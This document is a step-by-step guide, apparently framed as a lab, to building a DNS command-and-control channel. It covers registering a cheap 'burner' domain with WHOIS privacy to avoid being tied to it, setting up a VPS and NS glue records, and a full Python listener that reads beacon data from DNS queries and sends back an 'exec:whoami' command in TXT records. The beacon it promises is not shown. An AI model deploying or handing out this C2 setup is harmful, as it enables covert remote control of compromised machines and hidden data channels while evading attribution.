# The "From Scratch" DNS C2 Lab Guide

This guide covers the manual setup of a DNS C2 infrastructure, from domain acquisition to writing the custom Python Listener and Beacon.

## Phase 1: Infrastructure & The "Glue"

DNS tunneling works because of **Recursive Delegation**. When a client asks for a subdomain you own, the request travels through the Root and TLD servers until it hits _your_ server.

### 1.1 Buy a "Burner" Domain

- **Registrars:** Use [Porkbun](https://porkbun.com) or [Namecheap](https://namecheap.com).
- **Cost:** Look for `.xyz`, `.top`, or `.site` (usually $1.50 - $2.00 for the first year).
- **Privacy:** Ensure "WHOIS Privacy" is enabled (usually free) so your personal info isn't tied to a "C2" domain.

### 1.2 The VPS (The "C2")

- **Provider:** DigitalOcean, Linode, or AWS LightSail.
- **OS:** Ubuntu 24.04 LTS.
- **Networking:** \* Allow **UDP Port 53** (DNS) in the cloud firewall.
  - Disable `systemd-resolved` on the VPS, as it grabs Port 53 by default:
    ```bash
    sudo systemctl disable --now systemd-resolved
    sudo rm /etc/resolv.conf
    echo "nameserver 8.8.8.8" | sudo tee /etc/resolv.conf
    ```

### 1.3 Setting the Glue Records

Log into your Registrar's dashboard:

1.  **Create an 'A' Record:** \* Host: `ns1`
    - Value: `[Your_VPS_IP]`
2.  **Create an 'NS' Record (The Delegation):**
    - Host: `c2` (This creates `c2.yourdomain.com`)
    - Value: `ns1.yourdomain.com`

---

## Phase 2: Building the Server (The Listener)

We will use `dnslib` in Python because it handles the binary "wire format" of DNS packets so you don't have to manually bit-shift headers.

### `server.py`

```python
import socket
from dnslib import DNSRecord, QTYPE, RR, TXT

def start_server():
    # Bind to all interfaces on Port 53
    # Note: Requires sudo
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.bind(('0.0.0.0', 53))

    print("[+] C2 Server Active. Waiting for beacons...")

    while True:
        data, addr = sock.recvfrom(1024)
        request = DNSRecord.parse(data)
        qname = str(request.q.qname)

        # Structure: <encoded_payload>.c2.yourdomain.com
        # Extract the payload (everything before the first dot)
        parts = qname.split('.')
        encoded_payload = parts[0]

        print(f"[*] Incoming Query: {qname}")
        print(f"[*] Decoded Payload: {encoded_payload}")

        # The 'C2 Command' - you could make this dynamic
        command = "exec:whoami"

        # Build the DNS Response
        reply = request.reply()
        # We send the command back in a TXT record
        reply.add_answer(RR(qname, QTYPE.TXT, rdata=TXT(command)))

        sock.sendto(reply.pack(), addr)

if __name__ == "__main__":
    start_server()
```
